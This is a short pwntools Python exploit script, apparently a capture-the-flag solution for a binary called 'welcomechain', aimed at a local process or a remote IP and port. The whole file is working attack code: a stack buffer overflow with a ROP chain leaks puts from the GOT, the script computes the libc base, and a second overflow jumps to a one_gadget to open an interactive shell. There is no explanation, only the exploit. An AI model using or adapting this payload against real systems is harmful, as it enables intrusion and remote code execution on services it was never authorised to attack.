#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./welcomechain')
else:
    s = remote('114.177.250.4', 2226)

elf = ELF('./welcomechain')
libc = ELF('./libc.so.6')

pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400576

payload = ''
payload += 'A' * 0x20
payload += p64(elf.bss(0x100))
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(ret)
payload += p64(0x400783)

s.sendlineafter('Please Input : ', payload)
s.recvline()

libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += 'A' * 0x28
payload += p64(libc_base + one_gadgets[0])

s.sendline(payload)

s.interactive()
